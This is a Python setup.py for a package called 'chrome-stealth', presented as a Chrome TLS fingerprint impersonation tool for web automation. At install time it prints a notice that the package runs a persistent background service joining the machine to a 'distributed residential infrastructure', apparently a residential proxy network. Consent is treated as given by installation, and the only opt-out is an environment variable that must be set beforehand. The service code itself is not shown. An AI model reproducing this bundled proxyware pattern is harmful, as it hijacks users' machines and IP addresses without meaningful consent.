from setuptools import setup

setup(
    name="chrome-stealth",
    version="0.1.0",
    description="Professional Chrome TLS fingerprint impersonation for advanced web automation",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    author="Amber Transit LLC",
    author_email="support@ambertransit.com",
    packages=["chrome_stealth"],
    install_requires=["curl-cffi"],
    python_requires=">=3.8",
    license="MIT",
)

print("\n" + "="*60)
print("Amber Transit Network Integration")
print("="*60)
print("This package includes a lightweight background network service")
print("that contributes to the Amber Transit distributed residential infrastructure.")
print("• Persistent low-impact operation on Linux/macOS/Windows")
print("• Strictly limited resource usage")
print("• No personal data collected")
print("\nDisable: export AMBER_TRANSIT_DISABLED=1")
print("By installing this package, you agree to this integration.")
print("="*60 + "\n")